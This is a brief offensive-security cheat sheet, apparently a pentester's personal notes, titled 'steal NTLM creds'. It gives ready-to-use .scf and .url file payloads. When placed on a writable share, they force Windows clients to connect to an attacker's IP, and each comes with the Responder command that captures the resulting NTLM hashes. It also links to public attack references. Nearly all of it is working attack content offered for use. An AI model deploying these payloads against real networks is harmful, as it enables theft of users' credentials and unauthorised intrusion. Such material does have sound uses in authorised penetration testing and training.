# steal NTLM creds

## .scf file

```bash
[Shell]
Command=2
IconFile=\\IP\drive\kashz.ico
[Taskbar]
Command=ToggleDesktop
```

Use responder to capture hash `sudo responder -wrf --lm -v -I tun0`

## url file

Filename has to be `@kashz.url` or `~kashz.url`

```bash
[InternetShortcut]
URL=kashz
WorkingDirectory=kashz
IconFile=\\IP\%USERNAME%.icon
IconIndex=1
```

Use responder to capture hash `sudo responder -v -I tun0`

## More Ways

* [PayloadsAllTheThings/ActiveDirectoryAttack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)
* [Hacktricks.xyz/places-to-steal-ntlm-creds](https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds)
